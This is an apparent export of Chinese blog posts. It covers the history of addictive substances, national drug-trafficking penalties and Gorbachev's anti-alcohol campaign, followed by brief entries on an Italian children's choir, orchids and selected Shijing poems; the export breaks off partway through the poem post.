<p>喝威士忌酒在当时时尚的英国也是一个新生事物。比如我的父亲，除了在荒野打猎时或某个非常阴冷的地方，他从来不喝威士忌。他生活在“白兰地加苏打水”的年代，事实上，白兰地加苏打水在当时是很体面高雅的瘾品。（温斯顿·丘吉尔《丘吉尔传·我的青春》p138）</p>
</blockquote>
<p>1884年，著名的心理学家弗洛伊德首先拿自己做实验，使用可卡因之后感觉好的不得了，继而推荐亲朋好友使用可卡因（他接受过医师训练），作为酒精与吗啡上瘾之替代药品。凭着可卡因带来的兴奋感，写出了一篇叫《古柯颂歌》的论文，此举造成他的好友深染毒瘾（为了治疗受伤后遗症的疼痛）。对于这段错误判断可卡因的黑历史，弗洛伊德后面的著作中虽然多次自我检讨，但抹除了很多细节。</p>
<ul>
<li>战争：兴奋剂发展的强大动力</li>
</ul>
<p>战争带来的伤痛和恐惧会对士兵们的精神带来无比沉重的打击，因此人类社会大规模地集体服用兴奋剂都发生在战争时期。古希腊、罗马和现代法国军队都有配发红酒的传统，德国人配发啤酒，美国刚开始选择配发朗姆，自从内战之后就变成了威士忌。第一次世界大战把可卡因带进了前线，德国、法国的飞行员以及加拿大的部队都曾经使用过可卡因。伦敦热卖的医药套装盒子中包含有可卡因和海洛因，对于女孩子们而言这些盒子相当抢手，因为其宣传句就是“给前线的朋友最有用的礼物”，这些盒子会被她们迫切地送给身处前线的男朋友、未婚夫或是丈夫。希特勒曾注射甲基苯丙胺，特别是在苏德战争时期，纳粹军方广泛下发予士兵以作兴奋剂之用。日本也曾给士兵服用冰毒以提高战斗力，或者提供必须超长时间工作的军需工厂工人使用，在日本本土、台湾、及日占区都遗留下许多成瘾患者。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Addiction_IMG_3444.png" alt></p>
<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><ul>
<li>《精神疾病诊断与统计手册》（The Diagnostic and Statistical Manual of Mental Disorders，简称DSM）：由美国精神医学学会出版，是一本最常使用来诊断精神疾病的指导手册。</li>
<li>《柳叶刀》（The Lancet）：世界上最悠久及最受重视的同行评审性质之医学期刊之一。</li>
<li>拜耳股份公司（Bayer AG）：一家德国制药及化工跨国集团（康采恩），世界500强之一。最著名的产品是阿司匹林，其他包括海洛因、美沙酮、芥子毒气、环丙沙星、聚氨酯、毒鼠强、巴拉松及残杀威等。</li>
<li><a href="http://edition.cnn.com/2017/11/14/health/kratom-fda-warning/index.html" target="_blank" rel="noopener">Kratom 卡痛</a></li>
</ul>
<h2 id="扩展阅读：《嗑药简史》"><a href="#扩展阅读：《嗑药简史》" class="headerlink" title="扩展阅读：《嗑药简史》"></a>扩展阅读：《嗑药简史》</h2><h4 id="嗑药简史（一）：药物成瘾与神经系统"><a href="#嗑药简史（一）：药物成瘾与神经系统" class="headerlink" title="嗑药简史（一）：药物成瘾与神经系统"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史（一）：药物成瘾与神经系统</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、运动、性、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="嗑药简史（二）：瘾品跨境流动与外交关系"><a href="#嗑药简史（二）：瘾品跨境流动与外交关系" class="headerlink" title="嗑药简史（二）：瘾品跨境流动与外交关系"></a><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/" target="_blank" rel="noopener">嗑药简史（二）：瘾品跨境流动与外交关系</a></h4><p>扰动中美大国外交的 China Girl (芬太尼)</p>
<ul>
<li>什么是芬太尼,Fentanyl</li>
<li>大国外交的头等优先事项</li>
<li>预测：暗黑幽灵无国界</li>
</ul>
<h4 id="嗑药简史（三）：瘾品管制背后的情与法"><a href="#嗑药简史（三）：瘾品管制背后的情与法" class="headerlink" title="嗑药简史（三）：瘾品管制背后的情与法"></a><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/" target="_blank" rel="noopener">嗑药简史（三）：瘾品管制背后的情与法</a></h4><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/" target="_blank" rel="noopener">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h4 id="嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017"><a href="#嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017" class="headerlink" title="嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)"></a><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/" target="_blank" rel="noopener">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a></h4><h4 id="医学常识-NIH-情绪健康检查单"><a href="#医学常识-NIH-情绪健康检查单" class="headerlink" title="医学常识| NIH 情绪健康检查单"></a><a href="https://riboseyim.github.io/2018/01/22/Health-Emotional/" target="_blank" rel="noopener">医学常识| NIH 情绪健康检查单</a></h4><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://book.douban.com/subject/25908552/" target="_blank" rel="noopener">《上瘾五百年: 烟、酒、咖啡和鸦片的历史》|戴维·考特莱特</a></li>
</ul>
<blockquote>
<p>综合了心理、药物、经济、文化、生态等领域的研究，详细介绍所有能让人类成瘾的物品，以及瘾品背后的经济、文化和战争。瘾品在历史上的力量有多大？它们为何有合法与违禁之分？是什么力量将瘾品的流行推动为规模庞大、模式各异的商品贸易？作者从瘾品的功能用途到它们的发现，到全球贸易的流通和经济政策，全面介绍精神瘾品的文化，追踪出大众化瘾品进入全球贸易主流的来龙去脉，内容有趣，视野广博，令人眼界大开。毫无疑问，它是一本关于瘾品文化史的经典著作，也是一本横跨世界史与药物史的杰作。</p>
</blockquote>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.economist.com/graphic-detail/2019/06/25/what-is-the-most-dangerous-drug?fsrc=scn%2Ftw%2Fte%2Fbl%2Fed%2Fauto" target="_blank" rel="noopener">The Economist | What is the most dangerous drug?</a></li>
<li><a href="https://mp.weixin.qq.com/s/T09CYzwEMVfA6LcdWVipHA" target="_blank" rel="noopener">国家禁毒办权威发布毒品基础知识</a></li>
<li><a href="https://www.drugabuse.gov/publications/drugs-brains-behavior-science-addiction/drugs-brain" target="_blank" rel="noopener">Drugs, Brains, and Behavior: The Science of Addiction</a></li>
<li><a href="https://www.economist.com/news/science-and-technology/21729739-they-help-keep-parasites-bay-some-birds-use-discarded-cigarettes-fumigate" target="_blank" rel="noopener">Economist: Birds’ nests and parasites Some birds use discarded cigarettes to fumigate their nests </a></li>
<li><a href="https://www.drugabuse.gov/news-events/latest-science/nida-scientists-review-impact-smoking-among-adolescents-adhd" target="_blank" rel="noopener">NIDA scientists review impact of smoking among adolescents with ADHD</a></li>
<li><a href="http://www.nd.gov.hk/sc/druginfo.htm" target="_blank" rel="noopener">香港特别行政区政府保安局禁毒处</a></li>
<li><a href="https://mp.weixin.qq.com/s/mjnn9593R97Q_aKfwwqa_w" target="_blank" rel="noopener">物质使用障碍：这些要点你知道吗？| 原创 2016-05-11 医脉通 医脉通精神科</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODEwODAwNg==&amp;mid=214685820&amp;idx=4&amp;sn=df8dc588609f81c0aa21dd3503b6cf71&amp;scene=1&amp;srcid=09305GcytQoOJQvB0AzNQZ24#rd" target="_blank" rel="noopener">家暴施虐者背后的心理动机 | 潘幸知 欧美内参</a></li>
<li><a href="http://mil.sohu.com/20150302/n409262033.shtml" target="_blank" rel="noopener">鸦片在中国泛滥成灾的历史真相 | 人民网 </a></li>
<li><a href="http://news.xinhuanet.com/politics/2017-02/16/c_129482087.htm" target="_blank" rel="noopener">我国对卡芬太尼等四种芬太尼类物质进行列管 | 新华社，20170216</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDkzNjIwMg==&amp;mid=2651665139&amp;idx=2&amp;sn=a91d9338c7151720229af23ac2f3b92b&amp;chksm=8bbe9f16bcc916009c92435e25df9388dfcfcb0aa68b31af6937dd8a853a627d4e870c732499&amp;mpshare=1&amp;scene=1&amp;srcid=0917FiJ9Cl1ZCXRIXosJLDVa%23rd" target="_blank" rel="noopener">化学控制：激素如何影响你的身心</a></li>
<li><a href="http://www.guokr.com/post/452649/" target="_blank" rel="noopener">潜规则：类固醇的骗局 | 果壳网</a></li>
<li><a href="http://www.guokr.com/article/440185/" target="_blank" rel="noopener">狗眼看人亲，只因催产素 | 果壳网 </a></li>
<li><a href="http://www.guokr.com/article/438380/" target="_blank" rel="noopener">拥抱还是家暴：催产素的阴暗面 | 果壳网</a></li>
<li><a href="https://mp.weixin.qq.com/s/sJCnUGzwF2TyphOkpjS0Kg" target="_blank" rel="noopener">男性大脑也分泌催产素：“社交基因”可能通过它决定你究竟是外向还是内向 | 科研圈</a></li>
<li><a href="https://image.hanspub.org/Html/4-1130383_14325.htm" target="_blank" rel="noopener">音乐情绪及其神经基础 | 王璐，陈旭*，马建苓</a></li>
<li><a href="http://www.jianshu.com/p/88f20aa63c39" target="_blank" rel="noopener">小说中的经济学:粮食还是罂粟？</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI0MjY0OTkxNw==&amp;mid=2247486035&amp;idx=1&amp;sn=c77687ec4643d4c3e785f10c3d69a451&amp;chksm=e9785401de0fdd1705ce8dca1084fd9d6cf8bb4d72005453ab564b206448400265730ee7a676&amp;mpshare=1&amp;scene=1&amp;srcid=05286KwemlJx833YCMrY7nc8#rd" target="_blank" rel="noopener">肖朋友：垃圾游戏，毁我青春，废我钱财</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NTI0NzY4MA==&amp;mid=2655710754&amp;idx=3&amp;sn=df06dab1c2437cf602f2922a7a4ab378&amp;chksm=bd452d0d8a32a41be3443472f2f64201eb011dab8a28230509db6c3ba23701d460dcb47106e2&amp;mpshare=1&amp;scene=1&amp;srcid=1205ABQHjkiKYUMIlUAZC5GE%23rd" target="_blank" rel="noopener">吸食冰毒所致寄生虫妄想：治疗对策 | 经典病例</a></li>
<li><a href="https://www.1843magazine.com/food-drink/look-closer/licence-to-swill-how-to-drink-like-james-bond" target="_blank" rel="noopener">Licence to swill: how to drink like James Bond</a></li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>Economist</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>嗑药简史：瘾品管制背后的情与法</title>
    <url>/2018/01/07/Addiction-Decision-Law/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<a id="more"></a>
<h4 id="严刑峻法：瘾品管制与刑法量刑"><a href="#严刑峻法：瘾品管制与刑法量刑" class="headerlink" title="严刑峻法：瘾品管制与刑法量刑"></a>严刑峻法：瘾品管制与刑法量刑</h4><p>世界各国法律对于非法制售瘾品的处罚都比较严格。例如极易成瘾的海洛因，由于成瘾后生理危害大而且极难戒治，量刑尤为严格。</p>
<ul>
<li>中国大陆：根据《中华人民共和国刑法》，贩卖毒品（含海洛因）50克或以上，即可判处死刑。</li>
<li>英国：输入（importation）海洛因500克以上，处10年以上监禁；5公斤以上，处14年以上监禁；最高刑为终身监禁。</li>
<li>美国：较为宽松。基本罪级为16级，2年左右监禁；100公斤海洛因（或者500公斤可卡因），处20年监禁。</li>
<li>中国香港：根据《危险药物条例》，贩运危险药物人士最高可被判终身监禁及罚款500万港元。</li>
<li>中国台湾：根据《毒品危害防制条例》，海洛因、吗啡、鸦片、古柯碱及其相类制品，为一级毒品。制造、运输、贩卖处死刑或无期徒刑。</li>
<li>中国新加坡：根据新加坡法律，未经许可而进、出口多于15克的海洛因，或制造任何数量之海洛因者，一经定罪，一律判处死刑。</li>
<li>马来西亚：根据马来西亚《毒品条列》，任何人贩运多于15克的毒品（如海洛因、吗啡、鸦片等）如罪成，即唯一死刑，处绞死。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Addiction_IMG_3441.png" alt></p>
<p>海洛因按照纯度而分成4级，一号和二号海洛因实际指吗啡或吗啡盐类，三号海洛因是将盐酸吗啡制成二乙酰吗啡后，再添加大量的稀释剂而制成的，二乙酰吗啡和单乙酰吗啡总含量一般为25%至45%。四号海洛因是在盐酸吗啡经乙酰化反应后不稀释，而是提纯，沉淀，干燥。最终产品二乙酰吗啡含量一般在80%以上，最高可达99%。英国判例通常按100%纯度折算量刑，美国整体量刑较轻，一般主要考虑重量。</p>
<p>但是纵观各国历史，并不是所有瘾品都可以单纯在法律层面加以限制，还需要考虑社会习惯和民众心理。</p>
<h4 id="戈尔巴乔夫的禁酒运动"><a href="#戈尔巴乔夫的禁酒运动" class="headerlink" title="戈尔巴乔夫的禁酒运动"></a>戈尔巴乔夫的禁酒运动</h4><blockquote>
<p>前苏联发生的是似乎不可抗拒的历史力量与似乎不可移动的客观事实的冲撞，历史力量是合理化的改革，客观事实是俄罗斯的酗酒现象，结果是后者胜利。—— 《上瘾五百年: 烟、酒、咖啡和鸦片的历史》</p>
</blockquote>
<p>长久以来俄罗斯民族都有着豪饮烈酒的习惯。自沙皇政府以降，到后来的布尔什维克掌握政权，都曾经试图改变民间酗酒的风俗。1985年，戈尔巴乔夫成为苏联最高领导人。这位年仅54岁的最高统帅又一次开始了禁酒运动。</p>
<ul>
<li>苏共中央委员会通过决议《关于克服酗酒的管理办法》</li>
<li>苏联部长会议通过第410号决议《关于克服酗酒以及禁止私自酿酒的管理办法》</li>
<li>最高苏维埃主席团发布《关于加强同酗酒的斗争以及禁止私自酿酒》</li>
</ul>
<p>上述决议为反酗酒斗争赋予全权，执行规模空前之大。其中包括经济调控（显著缩减酒类饮品产量、限制售酒地点、控制售酒时间段— 只允许 14：00 - 19：00 售卖等），行政问责（政府、卫生和工会系统之外，苏联中央监察委员会主席亲自领衔组织反酗酒纠察队），刑事处罚（强制戒酒机构）。一时之间，苏联的众多酒鬼们有如过街老鼠，被纠察队和警察满大街追，迫不得已纷纷转为 “地下党”。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E7%98%BE%E5%93%81-%E9%85%92%E7%B2%BE-%E8%8B%8F%E8%81%941985.jpg" alt="邮票《戒酒——生活的准则》，1985年"></p>
<p>然而，官方白酒数量的减少和违禁的严重后果都阻止不了俄罗斯人喝酒，反而促成了民间酿酒市场的兴旺。这个时期涌现出各种各样的家酿酒和私制伏特加，还有部分人开始喝古龙水、化学酒精（甲基化酒精和工业酒精）以及被称为“药品”的代酒——含有酒精的药酒。但是小作坊的产品质量缺乏保证，酒精中毒导致的死亡案例不断增加。</p>
<p>私酒全部经由地下黑市交易，根本不缴纳任何赋税，导致政府财政的重大损失。根据苏联部长会议主席雷日科夫统计，酒税收入减少了 670 亿卢布（当时的卢布高于美元），直接加剧了财政赤字。以至于 1987 年戈尔巴乔夫恢复白酒的产量也于事无补，因为此时的私酒已经比官方的白酒售价便宜 30% 以上。</p>
<blockquote>
<p>许多俄罗斯人认为喝酒是斯拉夫民族的文化特色，简直视之为自己生来就应享有的权利。</p>
</blockquote>
<p>苏共高层发起禁酒运动的一个重要依据是“社会主义的建设者”的道德价值观衰退，对于劳动的热情锐减导致经济不振。随着禁酒运动的深入，苏联国内舆情汹涌，民众的反抗怒火很快就指向“体制”。</p>
<blockquote>
<p>数以百万计的普通百姓为了排遣单调枯燥的生活而喝酒，指挥他们的人却要他们保持清醒努力工作。但努力的结果是对谁有利呢？但努力的结果是对谁有利呢？拿到工资能买到必需的消费品吗？—— 商店的货架都是空的。上级承诺的体育设施和文化福利又在哪里？生活根本索然无味。—— 《上瘾五百年: 烟、酒、咖啡和鸦片的历史》</p>
</blockquote>
<p>首先，对于民众来说最明显的是伏特加价格的急剧上升。3-4卢布好日子已经一去不复返了，伏特加酒的价格迅速上涨。到 1986 年，最便宜、最劣质的伏特加也要卖 9 卢布 10 戈比。整个苏联，各个售酒点的门前都排起了长长的队伍。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E7%98%BE%E5%93%81-%E9%85%92%E7%B2%BE-%E8%8B%8F%E8%81%941986.jpg" alt></p>
<p>其次，在倒卖私酒的成员中包括很多军队和地方的党政机关。<strong>官僚们对苏共中央的指示置之不理，专心经营着地下室里的酿造厂业务</strong>，大发横财。禁酒运动招致表里不一、行事不公的指责。同时，戈尔巴乔夫采用高压式、强硬地推行禁酒，措施粗糙，急于求成。经统计，在1986年进过戒酒学习班的苏联公民超过 400 万人，被送进戒酒所接受15天强制戒酒的人超过了900万。当时的苏联经济和政府本来就已经处于停滞、混乱之中，社会矛盾尖锐。突如袭来的禁酒运动，无疑是给苏共自己培养了近千万人的政治反对派。当时民间流行的各种讽刺小曲儿，甚至开始有人说，<strong>老实而清醒的人卖劳力让既不老实又不清醒的人享受富裕，这等于是奴隶制度。</strong></p>
<blockquote>
<p>有过7卢布，有过8卢布。<br>我们过去喝酒，现在也不会停。<br>如果价格还要再涨，<br>我们就会像波兰人那样。<br>（暗指 1981 年波兰独立工会的反抗运动）</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E6%88%88%E5%B0%94%E5%B7%B4%E4%B9%94%E5%A4%AB-%E6%92%92%E5%88%87%E5%B0%94-198503.jpg" alt="1985年3月，撒切尔与戈尔巴乔夫在克里姆林宫会晤，英-苏关系改善"></p>
<blockquote>
<p>六点公鸡唱歌，<br>八点普加乔娃（著名女歌手），<br>商店关门到两点，<br>你问钥匙在哪？<br>在戈尔巴乔夫的腰包。</p>
</blockquote>
<p>最后，绝对禁酒的方案从人体科学角度看也做不到。第一，苏联大部分地区冬季漫长长，温度极低，喝酒可以帮助人们抵御寒冷，特别是对于那些缺乏足够供暖条件的底层民众来说，是生活的必需品。第二，长期大量摄入酒精会影响中枢神经系统，逐渐形成耐受性与心理依赖。突然减少或中断酒精摄入会出现酒精戒断症候群（Alcohol withdrawal syndrome） ：原本被抑制的神经系统过度活化，心理与生理上会因此产生各种难以忍受的痛苦，例如：肠胃不适、恶心和呕吐、全身疲倦、易累、焦虑与烦躁不安等，甚至全身性痉挛、意识障碍，以及妄想、幻觉等症状。</p>
<p>禁酒运动坚持两年之后，戈尔巴乔夫只好在一片漫骂声中草草收场。</p>
<h2 id="扩展阅读：《嗑药简史》"><a href="#扩展阅读：《嗑药简史》" class="headerlink" title="扩展阅读：《嗑药简史》"></a>扩展阅读：《嗑药简史》</h2><h4 id="嗑药简史（一）：药物成瘾与神经系统"><a href="#嗑药简史（一）：药物成瘾与神经系统" class="headerlink" title="嗑药简史（一）：药物成瘾与神经系统"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史（一）：药物成瘾与神经系统</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、运动、性、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="嗑药简史（二）：瘾品跨境流动与外交关系"><a href="#嗑药简史（二）：瘾品跨境流动与外交关系" class="headerlink" title="嗑药简史（二）：瘾品跨境流动与外交关系"></a><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/" target="_blank" rel="noopener">嗑药简史（二）：瘾品跨境流动与外交关系</a></h4><p>扰动中美大国外交的 China Girl (芬太尼)</p>
<ul>
<li>什么是芬太尼,Fentanyl</li>
<li>大国外交的头等优先事项</li>
<li>预测：暗黑幽灵无国界</li>
</ul>
<h4 id="嗑药简史（三）：瘾品管制背后的情与法"><a href="#嗑药简史（三）：瘾品管制背后的情与法" class="headerlink" title="嗑药简史（三）：瘾品管制背后的情与法"></a><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/" target="_blank" rel="noopener">嗑药简史（三）：瘾品管制背后的情与法</a></h4><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/" target="_blank" rel="noopener">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h4 id="嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017"><a href="#嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017" class="headerlink" title="嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)"></a><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/" target="_blank" rel="noopener">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a></h4><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.nobelprize.org/nobel_prizes/economic-sciences/laureates/1992/becker-bio.html" target="_blank" rel="noopener">《应该让毒品的使用合法化吗》| 盖瑞·贝克 （1992年诺贝尔经济学奖）</a></li>
<li><a href="http://www.twsport.org.tw/sljhs/old/%E6%98%A5%E6%9A%89%E5%B0%88%E6%A1%88/%E9%85%92/%E4%BA%86%E8%A7%A3%E9%85%97%E9%85%92%E8%88%87%E9%85%92%E7%99%AE.htm" target="_blank" rel="noopener">了解酗酒与酒瘾</a></li>
<li><a href="http://www.hfdsb.gov.cn/News/jsjs/201801/20180124113319_28949.html" target="_blank" rel="noopener">宁波破获特大卷烟案，案值上亿| 加热不燃烧新型卷烟非法经营案 | 2018-1-24　来源：宁波晚报　作者：张贻富</a></li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>Economist</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>Artistic-Antoniano</title>
    <url>/2019/01/20/Artistic-Antoniano/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Piccolo-Coro-dell’Antoniano"><a href="#Piccolo-Coro-dell’Antoniano" class="headerlink" title="Piccolo Coro dell’Antoniano"></a>Piccolo Coro dell’Antoniano</h2><p>The Piccolo Coro dell’Antoniano (English: Little Choir of Antoniano) is an Italian children’s choir from Bologna.</p>
<h2 id="曲目"><a href="#曲目" class="headerlink" title="曲目"></a>曲目</h2><ul>
<li><a href="https://www.youtube.com/watch?v=0IGweQFlBk4" target="_blank" rel="noopener">《国王与女巫的爱情  Il cuore del Re sara》</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.antoniano.it" target="_blank" rel="noopener">Piccolo Coro dell’Antoniano</a></li>
<li><a href="http://www.marieleventre.it/" target="_blank" rel="noopener">Mariele Ventre: la vita e le opere</a></li>
</ul>
]]></content>
      <tags>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title>Flower</title>
    <url>/2017/08/21/Artistic-Flower/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://songshuhui.net/archives/97318" target="_blank" rel="noopener">“兰花热”对野生兰犯下的罪 | 科学松鼠会@史军</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>风月集 | 诗三百 思无邪</title>
    <url>/2017/10/18/Artistic-Poetry/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>《诗经》精选</li>
<li>《诗经》的版本问题</li>
</ul>
<span id="more"></span>
<blockquote>
<p>《孔丛子·巡狩篇》：“古者天子命史采歌谣，以观民风。”</p>
</blockquote>
<p>关于《诗经》中诗的分类，有“四始”之说，即《风》、《大雅》、《小雅》、《颂》的四篇列首位的诗。《国风》按地区划分，包括“周南”、“召南”、“邶风”、“鄘风”、“卫风”、“王风”、“郑风”、“桧风”、“齐风”、“魏风”、“唐风”、“秦风”、“豳风”、“陈风”和“曹风”，共160篇。</p>
<h2 id="《诗经》的版本问题"><a href="#《诗经》的版本问题" class="headerlink" title="《诗经》的版本问题"></a>《诗经》的版本问题</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/Poetry.png" alt=""></p>
<p>《小雅》为宴请宾客之乐。《大雅》则是君臣庙堂的典礼之乐，多数是公卿大夫的作品。《颂》是贵族在家庙中敬祖先鬼神，歌颂文治武功的祭祀之乐。《诗经》中的精华部分是《国风》，后人将其与屈原的《离骚》并称为“风骚”。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01589.png" alt=""></p>
<h4 id="周南·关雎"><a href="#周南·关雎" class="headerlink" title="周南·关雎"></a>周南·关雎</h4><blockquote>
<p>关关雎鸠，在河之洲。窈窕淑女，君子好逑。<br>参差荇菜，左右流之。窈窕淑女，寤寐求之。<br>求之不得，寤寐思服。悠哉悠哉，辗转反侧。<br>参差荇菜，左右采之。窈窕淑女，寤寐求之。<br>参差荇菜，左右流之。窈窕淑女，琴瑟友之。<br>参差荇菜，左右芼之。窈窕淑女，鼓瑟乐之。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Poetry-IMG-GuanJu.png" alt=""></p>
<h4 id="王风·黍离"><a href="#王风·黍离" class="headerlink" title="王风·黍离"></a>王风·黍离</h4><blockquote>
<p>彼黍离离，彼稷之苗。行迈靡靡，中心摇摇。知我者，谓我心忧；不止我者，谓我何求。悠悠苍天，此何人哉！<br>彼黍离离，彼稷之穗。行迈靡靡，中心如醉。知我者，谓我心忧；不止我者，谓我何求。悠悠苍天，此何人哉！<br>彼黍离离，彼稷之实。行迈靡靡，中心如噎。知我者，谓我心忧；不止我者，谓我何求。悠悠苍天，此何人哉！</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Poetry-IMG-YuanYang.png" alt=""></p>
<h4 id="王风·采葛"><a href="#王风·采葛" class="headerlink" title="王风·采葛"></a>王风·采葛</h4><blockquote>
<p>彼采葛兮，一日不见，如三月兮。<br>彼采萧兮，一日不见，如三秋兮。<br>彼采艾兮，一日不见，如三岁兮。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Poetry-IMG-JianJia.png" alt=""></p>
<h4 id="齐风·甫田"><a href="#齐风·甫田" class="headerlink" title="齐风·甫田"></a>齐风·甫田</h4><blockquote>
<p>无田甫田，维莠骄骄。无思远人，劳心忉忉。<br>无田甫田，维莠桀桀。无思远人，劳心怛怛。<br>婉兮娈兮，总角兮，未几见兮，突而弁兮。</p>
</blockquote>
<h4 id="魏风·硕鼠"><a href="#魏风·硕鼠" class="headerlink" title="魏风·硕鼠"></a>魏风·硕鼠</h4><blockquote>
<p>硕鼠硕鼠，无食我黍。三岁贯女，莫我肯顾。逝将去女，适彼乐土。乐土乐土，得我所。<br>硕鼠硕鼠，无食我麦。三岁贯女，莫我肯德。逝将去女，适彼乐国。乐国乐国，爰得我直。<br>硕鼠硕鼠，无食我苗。三岁贯女，莫我肯劳。逝将去女，适彼乐郊。乐郊乐郊，谁之永号。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Poetry-IMG-He.png" alt=""></p>
<h4 id="陈风·月出"><a href="#陈风·月出" class="headerlink" title="陈风·月出"></a>陈风·月出</h4><blockquote>
<p>月出皎兮，佼人僚兮，舒窈纠兮，劳心悄兮。<br>月出皓兮，佼人兮，舒受兮，劳心兮。<br>月出照兮，佼人僚兮，舒夭绍兮，劳心惨兮。</p>
<p>子曰：“诗三百，一言以蔽之，思无邪”。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Poetry-Ya-circo.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Poetry-IMG-Ping.png" alt=""></p>
<h4 id="小雅·鹿鸣之什"><a href="#小雅·鹿鸣之什" class="headerlink" title="小雅·鹿鸣之什"></a>小雅·鹿鸣之什</h4><blockquote>
